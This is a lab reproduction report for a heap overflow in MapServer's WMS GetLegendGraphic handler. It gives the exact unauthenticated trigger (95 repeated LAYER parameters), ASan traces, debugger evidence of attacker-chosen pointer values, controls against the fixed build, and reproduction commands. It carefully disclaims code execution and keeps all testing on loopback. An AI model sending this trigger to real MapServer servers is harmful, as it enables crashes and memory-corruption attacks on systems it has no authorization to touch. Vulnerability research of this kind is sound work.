# MapServer2Shell — stock-build reproduction and live-process chosen-value control

**Target**: CVE-2026-77326 / GHSA-4mwc-qc95-5959, WMS `GetLegendGraphic`
repeated-`LAYER` heap overflow (CWE-787, CVSS 3.1 8.6, unauthenticated).
**Date**: 2026-11-22 ~03:06–03:11Z. **Lab only**: all listeners bound to
127.0.0.1; source fetches were read-only provisioning; no probe of any
external system.

## Result

- **Rung 3, upgraded from extracted harness to stock build + wire**: a real
  `GET` to a 127.0.0.1 HTTP listener carrying `SERVICE=WMS&
  REQUEST=GetLegendGraphic&VERSION=1.3.0&BBOX=0,0,1,1` and K=95 repeated
  `LAYER=` parameters makes a stock `rel-8-6-4` `mapserv` write 8 bytes 0
  bytes past an 800-byte `cgiRequestObj` parameter array, in
  `msWMSDispatch` at `src/mapwms.cpp:5991`. ASan reports it; the fixed
  `rel-8-6-5` build and the K=96/97 safe inputs do not.
- **Rung 4, upgraded from INSTRUMENTED harness to LIVE PROCESS**: under a
  debugger, a plain (non-ASan) stock process has `req->NumParams == 195`
  and out-of-bounds slots `ParamValues[100]` and `[150]` holding the
  byte-exact attacker string `DEADBEEFCAFEBABE`. Independently, the same
  live process passes a pointer whose numeric value is exactly the
  attacker's chosen 8 bytes to `free()` (`0x4542414245464143` for
  `DEADBEEFCAFEBABE`, `0x5a5a5a5a5a5a5a5a` for `ZZZZZZZZZZZZZZZZ`,
  `0x4141414141414141` for `AAAAAAAAAAAAAAAA`) and faults. This is
  **chosen bytes at a chosen offset and chosen-value control of a pointer
  argument in a live stock process**, not a harness marker.
- **Rung 5 remains UNKNOWN**: no lab-chosen command was executed, no code
  execution or control-flow redirection was observed, and there has been no
  independent witness replay of this wake's results. The debugger is an
  observation tool, not execution. Do not relabel this as RCE.

## Build provenance

| Item | Value |
| --- | --- |
| Vulnerable source | `https://codeload.github.com/MapServer/MapServer/tar.gz/refs/tags/rel-8-6-4`, sha256 `41d3ee09b49bfe24374661ed5177336f5d3c2874489cc73f1ace7feb75295a7e`, extracted to `lab/mapserver2shell/MapServer-rel-8-6-4/` |
| Fixed source | same URL, tag `rel-8-6-5`, sha256 `5d7cf16723ec234acbc598fb7f761e11253d96517f6b75a1a911ca48b52a1de9` |
| Compiler | gcc 13.3.0 (system), cmake 3.28.3 |
| ASan flags | `-fsanitize=address -fno-omit-frame-pointer -O1 -g` in `CMAKE_{C,CXX}_FLAGS`; same flag in executable/shared linker flags |
| WMS config | `-DWITH_WMS=ON -DWITH_LIBXML2=ON -DWITH_OGCAPI=ON -DWITH_WFS=ON -DWITH_WCS=ON -DWITH_GEOS=ON -DWITH_FCGI=ON -DWITH_FRIBIDI=ON -DWITH_HARFBUZZ=ON -DWITH_CAIRO=ON`; protobufc/postgis/curl/CGIS clients off; Python mapscript off; tests off. Same flags for 8.6.4 and 8.6.5. |
| Plain flags | identical configure, `-O0 -g -fno-omit-frame-pointer`, no sanitizer |
| Binaries | `lab/mapserver2shell/build-asan2/mapserv` (vulnerable ASan), `build-fixed/mapserv` (fixed ASan), `build-plain/mapserv` (vulnerable plain, debug symbols) |
| Configure/build logs | `lab/mapserver2shell/configure-asan2.log`, `build-asan2.log`, `configure-fixed.log`, `build-fixed.log`, `configure-plain.log`, `build-plain.log` (all rc 0) |

The lab mapfile `legend.map` has one POINT layer `layer0`, `wms_enable_request
"GetLegendGraphic GetMap"`, EPSG:4326 projection, one FEATURE and one CLASS.
`mapserver.conf` sets `MS_MAP_PATTERN "^/"` for the lab path. `poc.sh` builds
the query string and runs `mapserv` as a CGI process; `loopback_bridge.py` is
a 127.0.0.1:8077 HTTP→CGI bridge used for the wire test (plain Python
`http.server`, no external listener).

## Exact trigger

```
map=<abs>/lab/mapserver2shell/legend.map
  &SERVICE=WMS&VERSION=1.3.0&REQUEST=GetLegendGraphic&BBOX=0,0,1,1
  &LAYER=DEADBEEFCAFEBABE   (repeated K=95 times)
```

`BBOX` must be nonempty to take the content-dependent legend path. The five
fixed parameters give parsed count M=100, exactly the allocation capacity;
95 appends therefore run entirely out of bounds. With nine fixed parameters
in an earlier attempt, M=105 crossed the parse-time doubling to capacity
200 and K=95 stayed in bounds (rc 0) — the count of fixed parameters is
part of the trigger, as in the frontier harness.

## Evidence

### 1. Stock ASan build, direct CGI (`lab/mapserver2shell/asan-vuln-K95.err`)

```
==3618910==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5180000003a0
WRITE of size 8 at 0x5180000003a0 thread T0
    #0 msWMSDispatch .../src/mapwms.cpp:5991
    #1 msOWSDispatch .../src/mapows.c:367
    #2 msCGIDispatchRequest .../src/mapservutil.c:2266
    #3 main .../src/apps/mapserv.c:367
0x5180000003a0 is located 0 bytes after 800-byte region [0x518000000080,0x5180000003a0)
allocated by thread T0 here:
    #0 malloc
    #1 msSmallMalloc .../src/maputil.c:2544
    #2 msAllocCgiObj .../src/cgiutil.c:500
    #3 msAllocMapServObj .../src/maptemplate.c:5100
SUMMARY: AddressSanitizer: heap-buffer-overflow .../src/mapwms.cpp:5991 in msWMSDispatch
```

Process rc 1, stdout empty.

### 2. Wire reach (`wire-K95.headers`, `bridge-child-stderr.log`)

A real HTTP `GET /mapserv?…` to 127.0.0.1:8077 returned
`HTTP/1.0 500 Internal Server Error` with `X-Lab-Child-Rc: 1`; the child
ASan report in `bridge-child-stderr.log` contains the same
`msWMSDispatch:5991` 8-byte WRITE. No non-loopback traffic.

### 3. Live plain build, chosen bytes at chosen OOB offsets (`gdb-readback2.txt`)

Breakpoint at `mapwms.cpp:6017` (the `msWMSLoadGetMapParams` call, after the
vulnerable loop), K=95:

```
Breakpoint 1, msWMSDispatch (map=0x5555555d17c0, req=0x5555555b3400, ...)
$1 = 195
0x5555558f88f0: "DEADBEEFCAFEBABE"     <- req->ParamValues[100], OOB
0x5555558f9590: "DEADBEEFCAFEBABE"     <- req->ParamValues[150], OOB
```

Slots 100/150 are past the 100-entry / 800-byte allocation; the first 100
slots hold the parsed parameters. The strings are `msStrdup` copies of the
attacker's `LAYER` query values.

### 4. Live plain build, chosen pointer value at `free()` and crash

With K=95 and no debugger, each payload below faults (rc 139); under gdb:

| LAYER value (16 bytes) | `free(mem=…)` argument | Interpretation |
| --- | --- | --- |
| `DEADBEEFCAFEBABE` | `0x4542414245464143` | little-endian bytes `CAFEBABE` |
| `ZZZZZZZZZZZZZZZZ` | `0x5a5a5a5a5a5a5a5a` | eight `Z` bytes |
| `AAAAAAAAAAAAAAAA` | `0x4141414141414141` | eight `A` bytes |

Frame #0 is `__GI___libc_free`; the crashing destructor chain involves PROJ
`CoordinateSystemAxis`/`CoordinateSystem`. The exact path by which the
attacker bytes land in that pointer is **not traced here** and is left
UNKNOWN; the observation that the pointer argument equals the chosen bytes,
and that the process faults, is direct. At K=100/150/195 the process aborts
with a corrupted chunk size in `_int_free_merge_chunk`
(`crash-bt-K100.txt`) — the crash mode varies with K.

### 5. Controls

- **Safe input**: K=96 and K=97 on the vulnerable ASan binary: rc 0, empty
  stderr, no ASan report; only the ordinary `LayerNotDefined` XML. Same
  values on the plain binary: rc 0.
- **Fixed build**: K=95 against `rel-8-6-5` ASan `mapserv`: rc 0, empty
  stderr, no ASan report; ordinary `LayerNotDefined` XML.
  `rel-8-6-5/src/mapwms.cpp:5988-5989` has no append loop.
- **K sweep on the plain build** (payload `CAFEBABECAFEBABE`): K=96/97/98
  rc 0; K=100/150/195 rc 134; K=196/197/198 rc 0. Not every overflowing K
  crashes, which is why ASan is the boundary detector; K=98 and K=198 each
  write only one slot past a doubled allocation.

## Boundary and limitations

- Rung 4 here is live-process chosen-value control and a fault observed in a
  debugger, with a stock build and a real wire trigger. It is **not** a
  demonstration of arbitrary code execution, a benign command side effect,
  or reliable control-flow redirection. Rung 5 requires all of those plus
  independent witness replay; none is claimed.
- The HTTP bridge is a lab CGI adapter, not a production web server. It is
  sufficient to show that request bytes reach `msWMSDispatch`, not to claim
  exploitability behind a particular deployment's CGI configuration.
- Frontier's rung 1/2/3/4 harness evidence and witness replay #770 remain
  separately ESTABLISHED at their INSTRUMENTED label; nothing here revises
  that verdict, and this report has not yet been replayed by the witness.

## Reproduce

```
cd lab/mapserver2shell
./poc.sh 95                              # ASan vulnerable, rc 1
BIN=./build-fixed/mapserv ./poc.sh 95    # fixed control, rc 0
./poc.sh 97                              # safe-input control, rc 0
python3 loopback_bridge.py               # 127.0.0.1:8077 only
# then send GET /mapserv?map=$PWD/legend.map&SERVICE=WMS&VERSION=1.3.0\
#   &REQUEST=GetLegendGraphic&BBOX=0,0,1,1 plus 95 '&LAYER=DEADBEEFCAFEBABE'
./readback.sh 95                         # live gdb readback of OOB slots
```
